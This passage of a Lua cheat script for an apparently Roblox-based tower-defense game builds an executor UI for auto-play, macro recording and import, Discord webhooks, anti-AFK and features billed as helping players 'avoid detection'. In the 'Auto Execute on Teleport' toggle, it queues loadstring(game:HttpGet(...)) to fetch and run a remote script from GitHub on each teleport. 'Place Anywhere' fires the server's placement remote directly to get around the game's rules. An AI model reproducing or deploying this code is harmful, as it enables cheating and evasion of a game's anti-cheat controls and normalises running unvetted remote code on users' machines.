                    local pos = getgenv().AutoPlayConfig.unitPositions[i]
                    if pos then
                        updatePositionHologram(i)
                    end
                end
            end)
        end
    end,
    getgenv().AutoPlayConfig.positionHologram
)

Sections.AutoPlayLeft:SubLabel({ Text = "Shows markers at saved positions" })

for i = 1, 6 do
    Sections.AutoPlayLeft:Label({ Text = "Slot " .. i })
    
    Sections.AutoPlayLeft:Button({
        Name = "  Set Position",
        Callback = function()
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local pos = char.HumanoidRootPart.Position
                getgenv().AutoPlayConfig.unitPositions[i] = pos
                
                getgenv().Config.autoPlay.unitPositions[i] = {X = pos.X, Y = pos.Y, Z = pos.Z}
                saveConfig(getgenv().Config)
                
                updatePositionHologram(i)
                
                Window:Notify({
                    Title = "Position Set",
                    Description = "Unit " .. i .. " position saved!",
                    Lifetime = 2
                })
            else
                Window:Notify({
                    Title = "Error",
                    Description = "Character not found!",
                    Lifetime = 2
                })
            end
        end
    })
    
    Sections.AutoPlayLeft:Button({
        Name = "  Reset Position",
        Callback = function()
            getgenv().AutoPlayConfig.unitPositions[i] = nil
            
            getgenv().Config.autoPlay.unitPositions[i] = nil
            saveConfig(getgenv().Config)
            
            if getgenv()._PositionHolograms[i] then
                pcall(function()
                    if getgenv()._PositionHolograms[i].part then
                        getgenv()._PositionHolograms[i].part:Destroy()
                    end
                    if getgenv()._PositionHolograms[i].beam then
                        getgenv()._PositionHolograms[i].beam:Destroy()
                    end
                end)
                getgenv()._PositionHolograms[i] = nil
            end
            
            Window:Notify({
                Title = "Position Reset",
                Description = "Unit " .. i .. " position cleared!",
                Lifetime = 2
            })
        end
    })
    
    if i < 6 then
        Sections.AutoPlayLeft:Spacer()
    end
end

Sections.AutoPlayRight:Header({ Text = "⚙️ Auto Place & Upgrade Settings" })
Sections.AutoPlayRight:SubLabel({ Text = "Configure placement and upgrade caps per slot" })

getgenv().AutoPlaySliders = {
    placeCaps = {},
    upgradeCaps = {}
}


for i = 1, 6 do
    getgenv().AutoPlaySliders.placeCaps[i] = createSlider(
        Sections.AutoPlayRight,
        "Place Cap " .. i,
        "AutoPlayPlaceCap" .. i,
        0,
        5,
        getgenv().AutoPlayConfig.placeCaps[i],
        function(value)
            getgenv().AutoPlayConfig.placeCaps[i] = math.floor(value)
        end,
        "Default",
        0
    )
end

Sections.AutoPlayRight:Divider()

for i = 1, 6 do
    local savedValue = getgenv().Config.inputs["AutoPlayUpgradeCap" .. i]
    local defaultValue = savedValue and tonumber(savedValue) or 0
    
    getgenv().AutoPlaySliders.upgradeCaps[i] = createSlider(
        Sections.AutoPlayRight,
        "Upgrade Cap " .. i,
        "AutoPlayUpgradeCap" .. i,
        0,
        20,
        defaultValue,
        function(value)
            getgenv().AutoPlayConfig.upgradeCaps[i] = math.floor(value)
        end,
        "Default",
        0
    )
end

Sections.AutoPlayRight:Divider()

Sections.AutoPlayRight:SubLabel({ Text = "Priority: 1 = Highest (upgrades first), 6 = Lowest" })

for i = 1, 6 do
    if not getgenv().AutoPlayConfig.upgradePriorities then
        getgenv().AutoPlayConfig.upgradePriorities = {1, 2, 3, 4, 5, 6}
    end
    
    local savedPriority = getgenv().Config.inputs["AutoPlayUpgradePriority" .. i]
    local defaultPriority = savedPriority and tonumber(savedPriority) or i
    
    createSlider(
        Sections.AutoPlayRight,
        "Upgrade Priority " .. i,
        "AutoPlayUpgradePriority" .. i,
        1,
        6,
        defaultPriority,
        function(value)
            getgenv().AutoPlayConfig.upgradePriorities[i] = math.floor(value)
        end,
        "Default",
        0
    )
end



Sections.MacroLeft:Header({ Text = "📁 Macro Management" })
Sections.MacroLeft:SubLabel({ Text = "Create, select, and manage your macros" })

getgenv()._macroDropdown = createDropdown(
    Sections.MacroLeft,
    "Select Macro",
    "MacroSelect",
    getMacroNames(),
    false,
    function(value)
        getgenv().CurrentMacro = value
        if value and getgenv().Macros[value] then
            getgenv().MacroData = getgenv().Macros[value]
            getgenv().MacroTotalSteps = #getgenv().MacroData
            Window:Notify({
                Title = "Macro System",
                Description = "Selected: " .. value,
                Lifetime = 2
            })
        end
        saveMacroSettings()
        getgenv().UpdateMacroStatus()
    end,
    getgenv().CurrentMacro
)

getgenv()._macroCreateInput = createInput(
    Sections.MacroLeft,
    "Create New Macro",
    "MacroCreateNew",
    "Enter macro name and press Enter",
    "All",
    function(value)
        if not value or value == "" then
            Window:Notify({
                Title = "Macro System",
                Description = "Please enter a macro name",
                Lifetime = 3
            })
            return
        end
        
        if getgenv().Macros[value] then
            Window:Notify({
                Title = "Macro System",
                Description = "Macro '" .. value .. "' already exists",
                Lifetime = 3
            })
            return
        end
        
        local success = saveMacro(value, {})
        if success then
            loadMacros()
            local macroNames = getMacroNames()
            if getgenv()._macroDropdown then
                pcall(function()
                    getgenv()._macroDropdown:ClearOptions()
                    getgenv()._macroDropdown:InsertOptions(macroNames)
                    getgenv()._macroDropdown:UpdateSelection(value)
                end)
            end
            getgenv().CurrentMacro = value
            getgenv().MacroData = {}
            getgenv().MacroTotalSteps = 0
            
            if macroCreateInput and macroCreateInput.UpdateText then
                pcall(function()
                    macroCreateInput:UpdateText("")
                end)
                task.wait(0.1)
                pcall(function()
                    macroCreateInput:UpdateText("")
                end)
            end
            
            Window:Notify({
                Title = "Macro System",
                Description = "Created: " .. value,
                Lifetime = 3
            })
        else
            Window:Notify({
                Title = "Macro System",
                Description = "Failed to create macro",
                Lifetime = 3
            })
        end
    end,
    ""
)

Sections.MacroLeft:Button({
    Name = "🔄 Refresh Macro List",
    Callback = function()
        loadMacros()
        local macroNames = getMacroNames()
        if getgenv()._macroDropdown then
            pcall(function()
                getgenv()._macroDropdown:ClearOptions()
                getgenv()._macroDropdown:InsertOptions(macroNames)
            end)
        end
        Window:Notify({
            Title = "Macro System",
            Description = "Loaded " .. #macroNames .. " macro(s)",
            Lifetime = 2
        })
    end,
})

Sections.MacroLeft:Button({
    Name = "⚙️ Equip Macro Units",
    Callback = function()
        local selectedMacro = getgenv().CurrentMacro
        if not selectedMacro or selectedMacro == "" then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "Please select a macro first!",
                Lifetime = 3
            })
            return
        end
        
        local macroData = getgenv().MacroData or loadMacro(selectedMacro)
        if not macroData or #macroData == 0 then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "Failed to load macro data!",
                Lifetime = 3
            })
            return
        end
        
        local summonBlacklist = {
            ["TuskSummon_Act4"] = true,
            ["NarutoBaryonClone"] = true,
        }
        
        local macroUnits = {}
        local unitSet = {}
        for _, action in ipairs(macroData) do
            if action.ActionType == "Place" and action.TowerName then
                local towerName = action.TowerName
                
                local isSummon = summonBlacklist[towerName] or 
                                 towerName:find("Summon") or 
                                 towerName:find("Clone")
                
                if not isSummon and not unitSet[towerName] then
                    unitSet[towerName] = true
                    table.insert(macroUnits, towerName)
                end
            end
        end
        
        if #macroUnits == 0 then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "No units found in macro!",
                Lifetime = 3
            })
            return
        end
        
        local clientData = getClientData()
        if not clientData or not clientData.UnitData or not clientData.Slots then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "Failed to get client data!",
                Lifetime = 3
            })
            return
        end
        
        local unitIDs = {}
        for unitID, unitInfo in pairs(clientData.UnitData) do
            for _, macroUnit in ipairs(macroUnits) do
                if unitInfo.UnitName == macroUnit then
                    unitIDs[macroUnit] = unitID
                    break
                end
            end
        end
        
        local missingUnits = {}
        for _, macroUnit in ipairs(macroUnits) do
            if not unitIDs[macroUnit] then
                table.insert(missingUnits, macroUnit)
            end
        end
        
        if #missingUnits > 0 then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "Missing units: " .. table.concat(missingUnits, ", "),
                Lifetime = 5
            })
            return
        end
        
        local equipRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Equip")
        if not equipRemote then
            Window:Notify({
                Title = "Equip Macro Units",
                Description = "Equip remote not found!",
                Lifetime = 3
            })
            return
        end
        
        debugPrint("[Equip] Unequipping all units...")
        local unequipped = 0
        for unitID, unitInfo in pairs(clientData.UnitData) do
            if unitInfo.Equipped then
                pcall(function()
                    equipRemote:InvokeServer(unitID)
                    unequipped = unequipped + 1
                end)
            end
        end
        
        debugPrint("[Equip] Unequipped " .. unequipped .. " units")
        
        debugPrint("[Equip] Equipping macro units...")
        local equipped = 0
        for i, macroUnit in ipairs(macroUnits) do
            if i <= 6 then
                local unitID = unitIDs[macroUnit]
                if unitID then
                    pcall(function()
                        equipRemote:InvokeServer(unitID)
                        equipped = equipped + 1
                    end)
                end
            end
        end
        
        Window:Notify({
            Title = "Equip Macro Units",
            Description = "Equipped " .. equipped .. " unit(s) for " .. selectedMacro,
            Lifetime = 3
        })
    end,
})

Sections.MacroLeft:Button({
    Name = "🗑️ Delete Macro",
    Callback = function()
        local selectedMacro = getgenv().CurrentMacro
        if not selectedMacro or selectedMacro == "" then
            Window:Notify({
                Title = "Delete Macro",
                Description = "Please select a macro first!",
                Lifetime = 3
            })
            return
        end
        
        local macroPath = CONFIG_FOLDER .. "/macros/" .. selectedMacro .. ".json"
        
        local success = pcall(function()
            if isfile(macroPath) then
                delfile(macroPath)
            end
        end)
        
        if success then
            getgenv().Macros[selectedMacro] = nil
            getgenv().CurrentMacro = nil
            
            Window:Notify({
                Title = "Delete Macro",
                Description = "Deleted macro: " .. selectedMacro,
                Lifetime = 3
            })
            
            if getgenv().MacroDropdown then
                pcall(function()
                    getgenv().MacroDropdown:UpdateOptions(getMacroNames())
                    getgenv().MacroDropdown:UpdateValue("None")
                end)
            end
        else
            Window:Notify({
                Title = "Delete Macro",
                Description = "Failed to delete macro!",
                Lifetime = 3
            })
        end
    end,
})

Sections.MacroLeft:Divider()

Sections.MacroLeft:Header({ Text = "📥 Macro Import" })
Sections.MacroLeft:SubLabel({ Text = "Import macros from Discord links" })

getgenv()._macroImportInput = createInput(
    Sections.MacroLeft,
    "Import Link",
    "MacroImportLink",
    "Paste Discord link here",
    "All",
    function(value) end,
    ""
)

Sections.MacroLeft:Button({
    Name = "📥 Import Macro",
    Callback = function()
        local importLink = getgenv().Config.inputs.MacroImportLink or ""
        
        if not importLink or importLink == "" then
            Window:Notify({
                Title = "Macro Import",
                Description = "Please paste a link in the input box!",
                Lifetime = 3
            })
            return
        end
        
        if not importLink:match("cdn%.discordapp%.com") and not importLink:match("cdn%.discord%.com") then
            Window:Notify({
                Title = "Macro Import",
                Description = "Invalid Discord link!",
                Lifetime = 3
            })
            return
        end
        
        Window:Notify({
            Title = "Macro Import",
            Description = "Downloading macro...",
            Lifetime = 2
        })
        
        local success, result = ErrorHandler:wrapAsync(function()
            return game:HttpGet(importLink)
        end, "Download macro from Discord")
        
        if not success or not result then
            ErrorHandler:notify(Window, "Macro Import", "Failed to download macro from Discord link")
            return
        end
        
        local macroData
        success, macroData = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        
        if not success or not macroData then
            Window:Notify({
                Title = "Macro Import",
                Description = "Invalid macro file format!",
                Lifetime = 3
            })
            return
        end
        
        local macroName = importLink:match("/([^/]+)%.json") or "Imported_Macro_" .. os.time()
        macroName = macroName:gsub("%%20", " ")
        
        if getgenv().Macros[macroName] then
            macroName = macroName .. "_" .. os.time()
        end
        
        local saveSuccess = saveMacro(macroName, macroData)
        
        if saveSuccess then
            loadMacros()
            local macroNames = getMacroNames()
            if getgenv()._macroDropdown then
                pcall(function()
                    getgenv()._macroDropdown:ClearOptions()
                    getgenv()._macroDropdown:InsertOptions(macroNames)
                    getgenv()._macroDropdown:UpdateSelection(macroName)
                end)
            end
            
            getgenv().CurrentMacro = macroName
            getgenv().MacroData = macroData
            getgenv().MacroTotalSteps = #macroData
            
            if macroImportInput and macroImportInput.UpdateText then
                pcall(function()
                    macroImportInput:UpdateText("")
                end)
            end
            
            Window:Notify({
                Title = "Macro Import",
                Description = "✅ Imported: " .. macroName,
                Lifetime = 3
            })
        else
            Window:Notify({
                Title = "Macro Import",
                Description = "Failed to save imported macro!",
                Lifetime = 3
            })
        end
    end,
})

Sections.MacroLeft:Divider()

Sections.MacroLeft:Header({ Text = "🎬 Recording & Playback" })
Sections.MacroLeft:SubLabel({ Text = "Record new macros or play existing ones" })

getgenv().MacroRecordToggle = createToggleNoSave(
    Sections.MacroLeft,
    "Record Macro",
    "MacroRecordToggle",
    function(value)
        if value then
            if not getgenv().CurrentMacro or getgenv().CurrentMacro == "" then
                Window:Notify({
                    Title = "Macro System",
                    Description = "Please select or create a macro first",
                    Lifetime = 3
                })
                pcall(function()
                    getgenv().MacroRecordToggle:UpdateState(false)
                end)
                return
            end
            
            getgenv().MacroRecordingV2 = true
            getgenv().MacroDataV2 = {}
            getgenv().MacroRecordingStartTime = tick()
            getgenv().MacroStatusText = "Recording"
            getgenv().MacroCurrentStep = 0
            getgenv().MacroTotalSteps = 0
            
            pcall(function()
                local workspace = game:GetService("Workspace")
                if workspace:FindFirstChild("Towers") then
                    local towerCount = 0
                    print("[Macro] Scanning for existing towers...")
                    for _, tower in pairs(workspace.Towers:GetChildren()) do
                        print("[Macro Debug] Found tower: " .. tower.Name)
                        local owner = tower:FindFirstChild("Owner")
                        if owner then
                            print("[Macro Debug]   Owner: " .. tostring(owner.Value) .. ", LocalPlayer: " .. tostring(LocalPlayer))
                        end
                        if owner and owner.Value == LocalPlayer then
                            if tower:FindFirstChild("Upgrade") then
                                if not towerTracker.upgradeConnections[tower] then
                                    print("[Macro] Setting up listener for existing tower: " .. tower.Name)
                                    setupTowerUpgradeListener(tower)
                                end
                                towerTracker.upgradeLevels[tower] = tower.Upgrade.Value
                                towerCount = towerCount + 1
                                print("[Macro] Initialized upgrade level for " .. tower.Name .. ": " .. tower.Upgrade.Value)
                            else
                                print("[Macro Debug]   No Upgrade found for " .. tower.Name)
                            end
                        end
                    end
                    print("[Macro] Recording started - initialized " .. towerCount .. " existing towers")
                else
                    print("[Macro] Warning: workspace.Towers not found")
                end
            end)
            
            if getgenv().UpdateMacroStatus then
                getgenv().UpdateMacroStatus()
            end
            
            Window:Notify({
                Title = "Macro Recording",
                Description = "Recording started for: " .. getgenv().CurrentMacro,
                Lifetime = 3
            })
        else
            getgenv().MacroRecordingV2 = false
            
            if #getgenv().MacroDataV2 > 0 and getgenv().CurrentMacro then
                local success = saveMacro(getgenv().CurrentMacro, getgenv().MacroDataV2)
                if success then
                    loadMacros()
                    local macroNames = getMacroNames()
                    if getgenv()._macroDropdown then
                        pcall(function()
                            getgenv()._macroDropdown:ClearOptions()
                            getgenv()._macroDropdown:InsertOptions(macroNames)
                            getgenv()._macroDropdown:UpdateSelection(getgenv().CurrentMacro)
                        end)
                    end
                    
                    Window:Notify({
                        Title = "Macro Recording",
                        Description = "Saved " .. #getgenv().MacroDataV2 .. " steps to " .. getgenv().CurrentMacro,
                        Lifetime = 5
                    })
                else
                    Window:Notify({
                        Title = "Macro Recording",
                        Description = "Failed to save macro",
                        Lifetime = 3
                    })
                end
            else
                Window:Notify({
                    Title = "Macro Recording",
                    Description = "Recording stopped (no actions recorded)",
                    Lifetime = 3
                })
            end
            
            getgenv().MacroStatusText = "Idle"
            getgenv().MacroCurrentStep = 0
            getgenv().MacroTotalSteps = 0
        end
        getgenv().UpdateMacroStatus()
    end,
    false
)

getgenv().MacroPlayToggle = createToggle(
    Sections.MacroLeft,
    "Play Macro",
    "MacroPlayToggle",
    function(value)
        
        if value then
            if not getgenv().CurrentMacro or getgenv().CurrentMacro == "" then
                Window:Notify({
                    Title = "Macro System",
                    Description = "Please select a macro first",
                    Lifetime = 3
                })
                getgenv().MacroPlayEnabled = false
                pcall(function()
                    getgenv().MacroPlayToggle:UpdateState(false)
                end)
                return
            end
            
            if not getgenv().Macros[getgenv().CurrentMacro] or #getgenv().Macros[getgenv().CurrentMacro] == 0 then
                Window:Notify({
                    Title = "Macro System",
                    Description = "Selected macro is empty",
                    Lifetime = 3
                })
                getgenv().MacroPlayEnabled = false
                pcall(function()
                    getgenv().MacroPlayToggle:UpdateState(false)
                end)
                return
            end
            
            getgenv().MacroPlayEnabled = true
            getgenv().MacroStatusText = "Playing"
            Window:Notify({
                Title = "Macro Playback",
                Description = "Started: " .. getgenv().CurrentMacro .. " (" .. #getgenv().Macros[getgenv().CurrentMacro] .. " steps)",
                Lifetime = 3
            })
        else
            getgenv().MacroPlayEnabled = false
            getgenv().MacroStatusText = "Idle"
            Window:Notify({
                Title = "Macro Playback",
                Description = "Stopped",
                Lifetime = 3
            })
        end
        saveMacroSettings()
        getgenv().UpdateMacroStatus()
    end,
    getgenv().MacroPlayEnabled or false
)

createInput(
    Sections.MacroLeft,
    "Step Delay (seconds)",
    "MacroStepDelay",
    "Additional delay between steps",
    "Numeric",
    function(value)
        local delay = tonumber(value) or 0
        getgenv().MacroStepDelay = delay
        saveMacroSettings()
    end,
    tostring(getgenv().MacroStepDelay or 0)
)

createToggle(
    Sections.MacroLeft,
    "Record Abilities",
    "MacroRecordAbilities",
    function(value)
        getgenv().MacroRecordAbilities = value
        saveMacroSettings()
        Window:Notify({
            Title = "Macro Recording",
            Description = value and "Abilities will be recorded" or "Abilities will NOT be recorded",
            Lifetime = 3
        })
    end,
    getgenv().MacroRecordAbilities ~= false
)

Sections.MacroLeft:Divider()

Sections.MacroLeft:Header({ Text = "📊 Macro Status" })
Sections.MacroLeft:SubLabel({ Text = "Real-time playback information" })

getgenv().MacroStatusLabel = Sections.MacroLeft:Label({ Text = "Status: Idle" })
getgenv().MacroStepLabel = Sections.MacroLeft:Label({ Text = "📝 Step: 0/0" })
getgenv().MacroActionLabel = Sections.MacroLeft:Label({ Text = "⚡ Action: None" })
getgenv().MacroUnitLabel = Sections.MacroLeft:Label({ Text = "🗼 Unit: None" })
getgenv().MacroWaitingLabel = Sections.MacroLeft:Label({ Text = "⏳ Waiting: None" })


Sections.MacroRight:Header({ Text = "🗺️ Macro Maps" })
Sections.MacroRight:SubLabel({
    Text = "Assign macros to specific maps. When you join a game, the assigned macro will auto-load."
})

local selectedGamemode = "Story"
local mapElementsByGamemode = {}

local function updateMacroMapDisplay()
    for gamemode, elements in pairs(mapElementsByGamemode) do
        for _, element in pairs(elements) do
            pcall(function()
                if element and element.SetVisibility then
                    element:SetVisibility(false)
                end
            end)
        end
    end
    
    if mapElementsByGamemode[selectedGamemode] then
        for _, element in pairs(mapElementsByGamemode[selectedGamemode]) do
            pcall(function()
                if element and element.SetVisibility then
                    element:SetVisibility(true)
                end
            end)
        end
        return
    end
    
    mapElementsByGamemode[selectedGamemode] = {}
    local elements = mapElementsByGamemode[selectedGamemode]
    
    local maps = getMapsByMode(selectedGamemode)
    
    if #maps == 0 then
        local label = Sections.MacroRight:SubLabel({
            Text = "No maps available for " .. selectedGamemode
        })
        table.insert(elements, label)
        return
    end
    
    local divider = Sections.MacroRight:Divider()
    local header = Sections.MacroRight:SubLabel({ Text = "📍 " .. selectedGamemode .. " Maps" })
    table.insert(elements, divider)
    table.insert(elements, header)
    
    for _, mapName in ipairs(maps) do
        local key = selectedGamemode .. "_" .. mapName
        local currentMacro = getgenv().MacroMaps[key] or "None"
        
        local macroNames = getMacroNames()
        table.insert(macroNames, 1, "None")
        
        local dropdown = createDropdown(
            Sections.MacroRight,
            mapName,
            "MacroMap_" .. key,
            macroNames,
            false,
            function(value)
                if value ~= "None" then
                    getgenv().MacroMaps[key] = value
                    Window:Notify({
                        Title = "Macro Maps",
                        Description = mapName .. " → " .. value,
                        Lifetime = 2
                    })
                else
                    getgenv().MacroMaps[key] = nil
                    Window:Notify({
                        Title = "Macro Maps",
                        Description = mapName .. " cleared",
                        Lifetime = 2
                    })
                end
                saveMacroSettings()
            end,
            currentMacro
        )
        
        table.insert(elements, dropdown)
    end
end

local savedGamemode = getgenv().Config.dropdowns.MacroMapsGamemode or "Story"
selectedGamemode = savedGamemode

getgenv()._gamemodeDropdown = createDropdown(
    Sections.MacroRight,
    "Select Gamemode",
    "MacroMapsGamemode",
    {"Story", "Infinite", "Challenge", "LegendaryStages", "Raids", "Dungeon", "Survival", "ElementalCaverns", "Event", "MidnightHunt", "BowlDefense", "SlimeRush", "BossRush", "Siege", "Breach", "FinalExpedition"},
    false,
    function(value)
        selectedGamemode = value
        task.spawn(function()
            updateMacroMapDisplay()
        end)
    end,
    savedGamemode
)

task.spawn(function()
    task.wait(0.2)
    updateMacroMapDisplay()
end)




local function getMapsByGamemode(mode)
    if not MapData then return {} end
    if mode == "ElementalCaverns" then return {"Light","Nature","Fire","Dark","Water"} end
    if mode == "FinalExpedition" then mode = "Story" end
    local maps = {}
    for mapName, mapInfo in pairs(MapData) do
        if mapInfo.Type and type(mapInfo.Type) == "table" then
            for _, mapType in ipairs(mapInfo.Type) do
                if mapType == mode then 
                    table.insert(maps, mapName) 
                    break 
                end
            end
        end
    end
    table.sort(maps)
    return maps
end


Sections.WebhookLeft:Header({ Text = "🔔 Discord Integration" })
Sections.WebhookLeft:SubLabel({ Text = "Send game notifications to Discord" })

getgenv().WebhookEnabled = getgenv().Config.toggles.WebhookToggle or false
getgenv().WebhookURL = getgenv().Config.inputs.WebhookURL or ""
getgenv().DiscordUserID = getgenv().Config.inputs.DiscordUserID or ""
getgenv().PingOnSecretDrop = getgenv().Config.toggles.PingOnSecretToggle or false

createToggle(
    Sections.WebhookLeft,
    "Enable Webhook Notifications",
    "WebhookToggle",
    function(value)
        getgenv().WebhookEnabled = value
        if value then
            if (getgenv().WebhookURL == "" or not string.match(getgenv().WebhookURL, "^https://discord%.com/api/webhooks/")) then
                Window:Notify({
                    Title = "Webhook",
                    Description = "Please enter a valid webhook URL first",
                    Lifetime = 5
                })
                getgenv().WebhookEnabled = false
                getgenv().Config.toggles.WebhookToggle = false
                getgenv().SaveConfig(getgenv().Config)
            else
                Window:Notify({
                    Title = "Webhook",
                    Description = "Enabled",
                    Lifetime = 3
                })
            end
        else
            Window:Notify({
                Title = "Webhook",
                Description = "Disabled",
                Lifetime = 3
            })
        end
    end,
    getgenv().WebhookEnabled
)

Sections.WebhookLeft:Divider()

Sections.WebhookLeft:Header({ Text = "⚙️ Configuration" })
Sections.WebhookLeft:SubLabel({ Text = "Enter your Discord webhook details" })

createInput(
    Sections.WebhookLeft,
    "Webhook URL",
    "WebhookURL",
    "https://discord.com/api/webhooks/...",
    "All",
    function(value)
        getgenv().WebhookURL = value or ""
    end,
    getgenv().WebhookURL
)

createInput(
    Sections.WebhookLeft,
    "Discord User ID",
    "DiscordUserID",
    "123456789012345678",
    "Numeric",
    function(value)
        getgenv().DiscordUserID = value or ""
    end,
    getgenv().DiscordUserID
)

Sections.WebhookLeft:Divider()

Sections.WebhookLeft:Header({ Text = "🔔 Notification Preferences" })
Sections.WebhookLeft:SubLabel({ Text = "Customize when you get pinged" })

createToggle(
    Sections.WebhookLeft,
    "Ping on Secret Drop",
    "PingOnSecretToggle",
    function(value)
        getgenv().PingOnSecretDrop = value
        Window:Notify({
            Title = "Ping on Secret",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().PingOnSecretDrop
)

Sections.WebhookLeft:Divider()

Sections.WebhookLeft:Header({ Text = "👥 Server Information" })
Sections.WebhookLeft:SubLabel({ Text = "Include player information in webhooks" })

getgenv().WebhookIncludePlayerCount = getgenv().Config.toggles.WebhookIncludePlayerCount or false
getgenv().WebhookIncludePlayerNames = getgenv().Config.toggles.WebhookIncludePlayerNames or false

createToggle(
    Sections.WebhookLeft,
    "Include Player Count",
    "WebhookIncludePlayerCount",
    function(value)
        getgenv().WebhookIncludePlayerCount = value
        Window:Notify({
            Title = "Player Count",
            Description = value and "Will show in webhooks" or "Hidden from webhooks",
            Lifetime = 3
        })
    end,
    getgenv().WebhookIncludePlayerCount
)

createToggle(
    Sections.WebhookLeft,
    "Display Player Names",
    "WebhookIncludePlayerNames",
    function(value)
        getgenv().WebhookIncludePlayerNames = value
        Window:Notify({
            Title = "Player Names",
            Description = value and "Will show in webhooks" or "Hidden from webhooks",
            Lifetime = 3
        })
    end,
    getgenv().WebhookIncludePlayerNames
)


Sections.MiscLeft:Header({ Text = "⚡ Performance" })
Sections.MiscLeft:SubLabel({ Text = "Boost FPS and reduce lag" })

local isInLobby = GameStateDetector:isLobby()

if not isInLobby then
    createToggle(
        Sections.MiscLeft,
        "FPS Boost",
        "FPSBoostToggle",
        function(value)
            getgenv().FPSBoostEnabled = value
            Window:Notify({
                Title = "FPS Boost",
                Description = value and "Enabled" or "Disabled",
                Lifetime = 3
            })
        end,
        getgenv().FPSBoostEnabled
    )
else
    getgenv().FPSBoostEnabled = false
end

createToggle(
    Sections.MiscLeft,
    "Remove Enemies & Units",
    "RemoveEnemiesToggle",
    function(value)
        getgenv().RemoveEnemiesEnabled = value
        Window:Notify({
            Title = "Remove Enemies",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().RemoveEnemiesEnabled
)

createToggle(
    Sections.MiscLeft,
    "Black Screen Mode",
    "BlackScreenToggle",
    function(value)
        getgenv().BlackScreenEnabled = value
        Window:Notify({
            Title = "Black Screen",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
        pcall(function()
            local Lighting = game:GetService("Lighting")
            if value then
                Lighting.Brightness = 0
                Lighting.ClockTime = 0
                Lighting.FogEnd = 0
                Lighting.GlobalShadows = false
                Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
            else
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            end
        end)
    end,
    getgenv().BlackScreenEnabled
)

Sections.MiscLeft:Divider()

Sections.MiscLeft:Header({ Text = "🛡️ Safety" })
Sections.MiscLeft:SubLabel({ Text = "Stay safe and avoid detection" })

createToggle(
    Sections.MiscLeft,
    "Anti-AFK",
    "AntiAFKToggle",
    function(value)
        getgenv().AntiAFKEnabled = value
        Window:Notify({
            Title = "Anti-AFK",
            Description = value and "Enabled" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AntiAFKEnabled
)

createToggle(
    Sections.MiscLeft,
    "Auto Hide UI on Load",
    "AutoHideUI",
    function(value)
        getgenv().AutoHideUIEnabled = value
        Window:Notify({
            Title = "Auto Hide UI",
            Description = value and "Enabled - UI will minimize on next load" or "Disabled",
            Lifetime = 3
        })
    end,
    false
)

createToggle(
    Sections.MiscLeft,
    "Auto Execute on Teleport",
    "AutoExecuteToggle",
    function(value)
        getgenv().AutoExecuteEnabled = value
        
        local queueteleport = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport) or (Xeno and Xeno.queue_on_teleport)
        
        if value and queueteleport then
            local scriptToQueue = 'repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer; task.wait(2); loadstring(game:HttpGet("https://raw.githubusercontent.com/Byorl/ALS-Scripts/refs/heads/main/ALS%20Halloween%20UI.lua"))()'
            pcall(function()
                queueteleport(scriptToQueue)
            end)
            print("[ALS] ✅ Auto Execute enabled and queued")
        elseif value and not queueteleport then
            warn("[ALS] ⚠️ Auto Execute not supported by your executor")
        end
        
        Window:Notify({
            Title = "Auto Execute",
            Description = value and "Enabled - Script will auto-load on teleport" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().AutoExecuteEnabled
)

Sections.MiscLeft:Divider()

Sections.MiscLeft:Header({ Text = "🎯 Placement" })
Sections.MiscLeft:SubLabel({ Text = "Advanced tower placement options" })

if not getgenv().PlaceAnywhereEnabled then
    getgenv().PlaceAnywhereEnabled = getgenv().Config.toggles.PlaceAnywhereToggle or false
end

createToggle(
    Sections.MiscLeft,
    "Place Anywhere",
    "PlaceAnywhereToggle",
    function(value)
        getgenv().PlaceAnywhereEnabled = value
        Window:Notify({
            Title = "Place Anywhere",
            Description = value and "Enabled - Click on units to place them" or "Disabled",
            Lifetime = 3
        })
    end,
    getgenv().PlaceAnywhereEnabled
)

Sections.MiscLeft:SubLabel({
    Text = "Click on any unit preview in workspace to place it at that location"
})

if not isInLobby then
    getgenv()._PlaceAnywhereHelpers = getgenv()._PlaceAnywhereHelpers or {}
    
    getgenv()._PlaceAnywhereHelpers.Mouse = LocalPlayer:GetMouse()
    getgenv()._PlaceAnywhereHelpers.UIS = game:GetService("UserInputService")
    
    getgenv()._PlaceAnywhereHelpers.getUnitAtMouse = function()
        local target = getgenv()._PlaceAnywhereHelpers.Mouse.Target
        if not target then return nil end
        
        local current = target
        while current and current ~= workspace do
            if current:IsA("Model") and current.Parent == workspace then
                local hrp = current:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local towerInfo = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("TowerInfo")
                    if towerInfo and towerInfo:FindFirstChild(current.Name) then
                        return current.Name, hrp.CFrame
                    end
                end
            end
            current = current.Parent
        end
        
        return nil
    end
    
    getgenv()._PlaceAnywhereHelpers.Mouse.Button1Down:Connect(function()
        if not getgenv().PlaceAnywhereEnabled then return end
        
        ErrorHandler:wrapAsync(function()
            local unitName, unitCFrame = getgenv()._PlaceAnywhereHelpers.getUnitAtMouse()
            if unitName and unitCFrame then
                local placeRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("PlaceTower")
                if placeRemote then
                    placeRemote:FireServer(unitName, unitCFrame)
                    debugPrint("[Place Anywhere] Placed " .. unitName)
                    
                    Window:Notify({
                        Title = "Place Anywhere",
                        Description = "Placed " .. unitName,
                        Lifetime = 2
                    })
                end
            end
        end)
    end)
    
    getgenv()._PlaceAnywhereHelpers.UIS.TouchTap:Connect(function(touchPositions, gameProcessedEvent)
